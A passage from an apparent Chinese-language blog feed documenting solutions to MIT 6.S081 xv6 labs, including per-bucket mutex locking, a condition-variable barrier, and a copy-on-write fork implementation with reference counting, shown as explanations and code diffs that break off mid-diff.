break;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  pthread_mutex_lock(&amp;locks[i]);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(e)&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    // update the existing key.</span><span class="token prefix unchanged"> </span><span class="token line">    e->value = value;</span></span>@@ -54,7 +56,7 @@ void put(int key, int value)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    // the new is new.</span><span class="token prefix unchanged"> </span><span class="token line">    insert(key, value, &amp;table[i], table[i]);</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  pthread_mutex_unlock(&amp;locks[i]);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">static struct entry*</span></span>@@ -118,6 +120,10 @@ main(int argc, char *argv[])<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    keys[i] = random();</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  for (int i = 0; i &lt; NBUCKET; ++i) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    pthread_mutex_init(&amp;locks[i], NULL);</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  //</span><span class="token prefix unchanged"> </span><span class="token line">  // first the puts</span><span class="token prefix unchanged"> </span><span class="token line">  //</span></span></code></pre><h1 id="Barrier"><a href="#Barrier" class="headerlink" title="Barrier"></a>Barrier</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>最后一个实验主要是熟悉 POSIX 线程库中条件变量（conditional variable）的使用，实现的思路比较简单：前 nthread - 1 个线程在条件变量上休眠，最后一个线程将休眠的所有进程进行唤醒。有关条件变量的用法可以参考 OSTEP：<a href="https://pages.cs.wisc.edu/~remzi/OSTEP/threads-cv.pdf">OSTEP: Condition Variables</a>.</p><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/notxv6/barrier.c b/notxv6/barrier.cindex 12793e8..e4fd03e 100644<span class="token coord">--- a/notxv6/barrier.c</span><span class="token coord">+++ b/notxv6/barrier.c</span>@@ -30,7 +30,18 @@ barrier()<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  // Block until all threads have called barrier() and</span><span class="token prefix unchanged"> </span><span class="token line">  // then increment bstate.round.</span><span class="token prefix unchanged"> </span><span class="token line">  //  </span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  pthread_mutex_lock(&amp;bstate.barrier_mutex);</span><span class="token prefix inserted">+</span><span class="token line">  ++bstate.nthread;</span><span class="token prefix inserted">+</span><span class="token line">  if (bstate.nthread == nthread) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    pthread_cond_broadcast(&amp;bstate.barrier_cond);</span><span class="token prefix inserted">+</span><span class="token line">++bstate.round;</span><span class="token prefix inserted">+</span><span class="token line">bstate.nthread = 0;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  else &#123;</span><span class="token prefix inserted">+</span><span class="token line">    pthread_cond_wait(&amp;bstate.barrier_cond, &amp;bstate.barrier_mutex);</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  pthread_mutex_unlock(&amp;bstate.barrier_mutex);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Uthread-switching-between-threads&quot;&gt;&lt;a href=&quot;#Uthread-switching-between-threads&quot; class=&quot;headerlink&quot; title=&quot;Uthread: switching between</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab Copy on-write</title>
    <link href="http://lordaeronesz.github.io/2024/08/13/MIT6.s081-2021-Lab%20Copy%20on-write/"/>
    <id>http://lordaeronesz.github.io/2024/08/13/MIT6.s081-2021-Lab%20Copy%20on-write/</id>
    <published>2024-08-13T03:45:11.000Z</published>
    <updated>2024-08-13T10:01:33.110Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Implement-copy-on-write"><a href="#Implement-copy-on-write" class="headerlink" title="Implement copy-on write"></a>Implement copy-on write</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>xv6 使用 <code>fork()</code> 系统调用创建子进程时，需要将父进程的地址空间进行 <strong>深拷贝</strong> ，即将页表和实际物理空间同时进行拷贝，以实现父进程和子进程地址空间的独立性。但很多时候，如 shell 程序，<code>fork()</code> 通常与 <code>exec()</code> 搭配使用，首先使用 <code>fork()</code> 创建子进程，随后在子进程中使用 <code>exec()</code> 将指定的程序加载到当前地址空间，这样在 <code>fork()</code> 中进行的地址空间拷贝就白白浪费了。</p><p>本实现要求实现一个写时复制（copy-on write）的 <code>fork()</code> 系统调用。具体来说，在进行虚拟内存拷贝时，不直接进行物理内存的拷贝，只是将父进程的页表复制给子进程，这样子进程和父进程的每个虚拟页面都指向了同一个物理页面，当子进程需要对某个虚拟页面进行写入时，为了保证父进程和子进程之间的独立性，子进程此时将进行物理内存的分配和拷贝，再进行写入。</p><h2 id="实现方案"><a href="#实现方案" class="headerlink" title="实现方案"></a>实现方案</h2><p>根据提示，可以将上述的写时复制的思路用 <strong>异常</strong> 的方式来实现。</p><p>首先可以利用页表项的 flags 中的 RSW 位来表示页表项是否为 COW 页，以便后续的异常处理。</p><p>修改 <code>uvmcopy()</code> ，将物理页面的分配操作去除，只是进行页表的拷贝，并将父进程和子进程的对应页表项的 PTE_W 置 0（以便在对 COW 页进行写入时陷入内核）、PTE_COW 置 1。</p><p>修改 <code>usertrap()</code>，当陷入内核时，内核通过查看 scause 寄存器（见下图）以及页表项的 PTE_W 和 PTE_COW 位，识别到陷入原因是发生在 COW 页上的 store page fault（寄存器值为 15）时，进行对应的异常处理：使用 <code>kalloc()</code> 为其分配物理页面，并将其页表项指向的物理地址数据拷贝到新分配的物理地址下，实现物理内存的拷贝。此时由于页表映射发生了改变，需要插入新的页表项，并删除旧的页表项。在处理了 COW 异常之后，该页面将不再是一个 COW 页，因此需要将 PTE_W 置 1、PTE_COW 置 0。</p><p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Copy%20on-write/pf.png" alt></p><p>为了后续实现的方便，可以将 COW 页的判断和 COW 页的异常处理分别封装为两个函数：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">iscowpage</span><span class="token punctuation">(</span><span class="token class-name">pagetable_t</span> pgtbl<span class="token punctuation">,</span> uint64 va<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>va <span class="token operator">>=</span> MAXVA<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token class-name">pte_t</span> <span class="token operator">*</span>pte <span class="token operator">=</span> <span class="token function">walk</span><span class="token punctuation">(</span>pgtbl<span class="token punctuation">,</span> va<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pte <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>pte <span class="token operator">&amp;</span> PTE_V<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>pte <span class="token operator">&amp;</span> PTE_U<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">*</span>pte <span class="token operator">&amp;</span> PTE_COW<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">cowfault</span><span class="token punctuation">(</span><span class="token class-name">pagetable_t</span> pagetable<span class="token punctuation">,</span> uint64 va<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    uint64 va0 <span class="token operator">=</span> <span class="token function">PGROUNDDOWN</span><span class="token punctuation">(</span>va<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">pte_t</span><span class="token operator">*</span> pte<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pte <span class="token operator">=</span> <span class="token function">walk</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    uint64 flags <span class="token operator">=</span> <span class="token function">PTE_FLAGS</span><span class="token punctuation">(</span><span class="token operator">*</span>pte<span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64 pa0 <span class="token operator">=</span> <span class="token function">PTE2PA</span><span class="token punctuation">(</span><span class="token operator">*</span>pte<span class="token punctuation">)</span><span class="token punctuation">;</span>    flags <span class="token operator">&amp;=</span> <span class="token punctuation">(</span><span class="token operator">~</span>PTE_COW<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// clear COW bit</span>    flags <span class="token operator">|=</span> PTE_W<span class="token punctuation">;</span>      <span class="token comment">// set write bit</span>    uint64 mem<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mem <span class="token operator">=</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span><span class="token function">kalloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">memmove</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>mem<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>pa0<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// remove old PTE</span>    <span class="token function">uvmunmap</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// install new PTE</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mappages</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">,</span> mem<span class="token punctuation">,</span> flags<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">kfree</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>mem<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>此外，还需要为每个物理页面引入 <strong>引用计数（reference count）</strong> ，页面创建时计数为 1，每次添加或移除指向该物理地址的页表项都增加或减少引用计数，当引用计数为 0 时释放该物理页面。这里有一个实现的技巧：将引用计数的减少放到 <code>kfree()</code> 中，在 <code>kfree()</code> 中根据引用计数的大小决定是否释放物理页面。</p><p>最后，也是很容易忽视的一点，修改 <code>copyout()</code> 以实现对 COW 页的支持。刚开始看到这个提示的时候我很疑惑，前面的工作貌似已经足够实现 COW 了，为什么还要修改 <code>copyout</code>？原来 xv6 对 COW 页进行写时复制都是基于 store page fault，即当尝试写入一个 PTE_W 为 0 的页面时触发异常，导致陷入内核，再由内核进行 COW 页面的异常处理，其中陷入内核的操作是由硬件自动来完成的，具体来说，是在虚实地址转换阶段由 MMU 来完成的。而 <code>copyout()</code> 是运行在内核态下的函数，其地址转换是由内核中的函数 <code>walk()</code> 来实现的，因而不会自动触发异常并交由异常处理程序来处理，而需要手动来完成。由于前面已经将 COW 页的判断和处理封装成了函数，因此对 <code>copyout()</code> 的修改很简单：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">iscowpage</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">cowfault</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/defs.h b/kernel/defs.hindex 3564db4..f5a9d8d 100644<span class="token coord">--- a/kernel/defs.h</span><span class="token coord">+++ b/kernel/defs.h</span>@@ -63,6 +63,7 @@ void            ramdiskrw(struct buf*);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void*           kalloc(void);</span><span class="token prefix unchanged"> </span><span class="token line">void            kfree(void *);</span><span class="token prefix unchanged"> </span><span class="token line">void            kinit(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">void            incrfcount(void*);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// log.c</span><span class="token prefix unchanged"> </span><span class="token line">void            initlog(int, struct superblock*);</span></span>@@ -145,6 +146,8 @@ void            trapinit(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void            trapinithart(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern struct spinlock tickslock;</span><span class="token prefix unchanged"> </span><span class="token line">void            usertrapret(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int             iscowpage(pagetable_t, uint64);</span><span class="token prefix inserted">+</span><span class="token line">int             cowfault(pagetable_t, uint64);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// uart.c</span><span class="token prefix unchanged"> </span><span class="token line">void            uartinit(void);</span></span>@@ -170,6 +173,7 @@ uint64          walkaddr(pagetable_t, uint64);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int             copyout(pagetable_t, uint64, char *, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">int             copyin(pagetable_t, char *, uint64, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">int             copyinstr(pagetable_t, char *, uint64, uint64);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pte_t*          walk(pagetable_t, uint64, int);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// plic.c</span><span class="token prefix unchanged"> </span><span class="token line">void            plicinit(void);</span></span>diff --git a/kernel/kalloc.c b/kernel/kalloc.cindex fa6a0ac..5872b85 100644<span class="token coord">--- a/kernel/kalloc.c</span><span class="token coord">+++ b/kernel/kalloc.c</span>@@ -14,6 +14,11 @@ void freerange(void *pa_start, void *pa_end);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern char end[]; // first address after kernel.</span><span class="token prefix unchanged"> </span><span class="token line">                   // defined by kernel.ld.</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define PA2RFIDX(pa) ((((uint64)pa) - KERNBASE) / PGSIZE)</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">int rfcount[(PHYSTOP - KERNBASE) / PGSIZE];</span><span class="token prefix inserted">+</span><span class="token line">struct spinlock rflock;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">struct run &#123;</span><span class="token prefix unchanged"> </span><span class="token line">  struct run *next;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span>@@ -27,6 +32,7 @@ void<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">kinit()</span><span class="token prefix unchanged"> </span><span class="token line">&#123;</span><span class="token prefix unchanged"> </span><span class="token line">  initlock(&amp;kmem.lock, "kmem");</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  initlock(&amp;rflock, "rflock");</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  freerange(end, (void*)PHYSTOP);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -51,15 +57,17 @@ kfree(void *pa)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(((uint64)pa % PGSIZE) != 0 || (char*)pa &lt; end || (uint64)pa >= PHYSTOP)</span><span class="token prefix unchanged"> </span><span class="token line">    panic("kfree");</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  // Fill with junk to catch dangling refs.</span><span class="token prefix deleted">-</span><span class="token line">  memset(pa, 1, PGSIZE);</span><span class="token prefix deleted">-</span><span class="token line"></span><span class="token prefix deleted">-</span><span class="token line">  r = (struct run*)pa;</span><span class="token prefix deleted">-</span><span class="token line"></span><span class="token prefix deleted">-</span><span class="token line">  acquire(&amp;kmem.lock);</span><span class="token prefix deleted">-</span><span class="token line">  r->next = kmem.freelist;</span><span class="token prefix deleted">-</span><span class="token line">  kmem.freelist = r;</span><span class="token prefix deleted">-</span><span class="token line">  release(&amp;kmem.lock);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  acquire(&amp;rflock);</span><span class="token prefix inserted">+</span><span class="token line">  if(--rfcount[PA2RFIDX(pa)] &lt;= 0)&#123;</span><span class="token prefix inserted">+</span><span class="token line">    memset(pa, 1, PGSIZE);</span><span class="token prefix inserted">+</span><span class="token line">    // Fill with junk to catch dangling refs.</span><span class="token prefix inserted">+</span><span class="token line">    r = (struct run*)pa;</span><span class="token prefix inserted">+</span><span class="token line">    acquire(&amp;kmem.lock);</span><span class="token prefix inserted">+</span><span class="token line">    r->next = kmem.freelist;</span><span class="token prefix inserted">+</span><span class="token line">    kmem.freelist = r;</span><span class="token prefix inserted">+</span><span class="token line">    release(&amp;kmem.lock);</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  release(&amp;rflock);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// Allocate one 4096-byte page of physical memory.</span></span>@@ -76,7 +84,15 @@ kalloc(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    kmem.freelist = r->next;</span><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;kmem.lock);</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  if(r)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  if(r) &#123;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    memset((char*)r, 5, PGSIZE); // fill with junk</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    rfcount[PA2RFIDX(r)] = 1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  return (void*)r;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">void incrfcount(void* pa)&#123;</span><span class="token prefix inserted">+</span><span class="token line">  acquire(&amp;rflock);</span><span class="token prefix inserted">+</span><span class="token line">  ++rfcount[PA2RFIDX(pa)];</span><span class="token prefix inserted">+</span><span class="token line">  release(&amp;rflock);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/kernel/riscv.h b/kernel/riscv.hindex 1691faf..a6ba9e7 100644<span class="token coord">--- a/kernel/riscv.h</span><span class="token coord">+++ b/kernel/riscv.h</span>@@ -343,6 +343,8 @@ sfence_vma()<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define PTE_W (1L &lt;&lt; 2)</span><span class="token prefix unchanged"> </span><span class="token line">#define PTE_X (1L &lt;&lt; 3)</span><span class="token prefix unchanged"> </span><span class="token line">#define PTE_U (1L &lt;&lt; 4) // 1 -> user can access</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define PTE_COW (1L &lt;&lt; 8) // 1 -> is a COW page</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// shift a physical address to the right place for a PTE.</span><span class="token prefix unchanged"> </span><span class="token line">#define PA2PTE(pa) ((((uint64)pa) >> 12) &lt;&lt; 10)</span></span>diff --git a/kernel/trap.c b/kernel/trap.cindex a63249e..0fb7687 100644<span class="token coord">--- a/kernel/trap.c</span><span class="token coord">+++ b/kernel/trap.c</span>@@ -29,6 +29,42 @@ trapinithart(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  w_stvec((uint64)kernelvec);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">int iscowpage(pagetable_t pgtbl, uint64 va) &#123;</span><span class="token prefix inserted">+</span><span class="token line">  if (va >= MAXVA) return 0;</span><span class="token prefix inserted">+</span><span class="token line">  pte_t *pte = walk(pgtbl, va, 0);</span><span class="token prefix inserted">+</span><span class="token line">  if (pte == 0) return 0;</span><span class="token prefix inserted">+</span><span class="token line">  if ((*pte &amp; PTE_V) == 0) return 0;</span><span class="token prefix inserted">+</span><span class="token line">  if ((*pte &amp; PTE_U) == 0) return 0;</span><span class="token prefix inserted">+</span><span class="token line">  return *pte &amp; PTE_COW;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">int cowfault(pagetable_t pagetable, uint64 va) &#123;</span><span class="token prefix inserted">+</span><span class="token line">  uint64 va0 = PGROUNDDOWN(va);</span><span class="token prefix inserted">+</span><span class="token line">  pte_t* pte;</span><span class="token prefix inserted">+</span><span class="token line">  if((pte = walk(pagetable, va0, 0)) == 0) return -1;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  uint64 flags = PTE_FLAGS(*pte);</span><span class="token prefix inserted">+</span><span class="token line">  uint64 pa0 = PTE2PA(*pte);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  flags &amp;= (~PTE_COW); // clear COW bit</span><span class="token prefix inserted">+</span><span class="token line">  flags |= PTE_W;      // set write bit</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  uint64 mem;</span><span class="token prefix inserted">+</span><span class="token line">  if ((mem = (uint64)kalloc()) == 0) return -1;</span><span class="token prefix inserted">+</span><span class="token line">  memmove((void *)mem, (void *)pa0, PGSIZE);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  // remove old PTE</span><span class="token prefix inserted">+</span><span class="token line">  uvmunmap(pagetable, va0, 1, 1);</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // install new PTE</span><span class="token prefix inserted">+</span><span class="token line">  if(mappages(pagetable, va0, PGSIZE, mem, flags) &lt; 0)&#123;</span><span class="token prefix inserted">+</span><span class="token line">    kfree((void *)mem);</span><span class="token prefix inserted">+</span><span class="token line">    return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//</span><span class="token prefix unchanged"> </span><span class="token line">// handle an interrupt, exception, or system call from user space.</span><span class="token prefix unchanged"> </span><span class="token line">// called from trampoline.S</span></span>@@ -67,7 +103,12 @@ usertrap(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    syscall();</span><span class="token prefix unchanged"> </span><span class="token line">  &#125; else if((which_dev = devintr()) != 0)&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    // ok</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  &#125; else &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  &#125; else if (r_scause() == 15 &amp;&amp; iscowpage(p->pagetable, r_stval())) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    if (cowfault(p->pagetable, r_stval()) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      p->killed = 1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  else &#123;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    printf("usertrap(): unexpected scause %p pid=%d\n", r_scause(), p->pid);</span><span class="token prefix unchanged"> </span><span class="token line">    printf("            sepc=%p stval=%p\n", r_sepc(), r_stval());</span><span class="token prefix unchanged"> </span><span class="token line">    p->killed = 1;</span></span>diff --git a/kernel/vm.c b/kernel/vm.cindex d5a12a0..df0ddde 100644<span class="token coord">--- a/kernel/vm.c</span><span class="token coord">+++ b/kernel/vm.c</span>@@ -303,22 +303,20 @@ uvmcopy(pagetable_t old, pagetable_t new, uint64 sz)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  pte_t *pte;</span><span class="token prefix unchanged"> </span><span class="token line">  uint64 pa, i;</span><span class="token prefix unchanged"> </span><span class="token line">  uint flags;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  char *mem;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  for(i = 0; i &lt; sz; i += PGSIZE)&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    if((pte = walk(old, i, 0)) == 0)</span><span class="token prefix unchanged"> </span><span class="token line">      panic("uvmcopy: pte should exist");</span><span class="token prefix unchanged"> </span><span class="token line">    if((*pte &amp; PTE_V) == 0)</span><span class="token prefix unchanged"> </span><span class="token line">      panic("uvmcopy: page not present");</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    *pte &amp;= ~PTE_W;   // set write bit</span><span class="token prefix inserted">+</span><span class="token line">    *pte |= PTE_COW;  // clear COW bit</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pa = PTE2PA(*pte);</span><span class="token prefix unchanged"> </span><span class="token line">    flags = PTE_FLAGS(*pte);</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    if((mem = kalloc()) == 0)</span><span class="token prefix deleted">-</span><span class="token line">      goto err;</span><span class="token prefix deleted">-</span><span class="token line">    memmove(mem, (char*)pa, PGSIZE);</span><span class="token prefix deleted">-</span><span class="token line">    if(mappages(new, i, PGSIZE, (uint64)mem, flags) != 0)&#123;</span><span class="token prefix deleted">-</span><span class="token line">      kfree(mem);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    if(mappages(new, i, PGSIZE, pa, flags) != 0)&#123;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">      goto 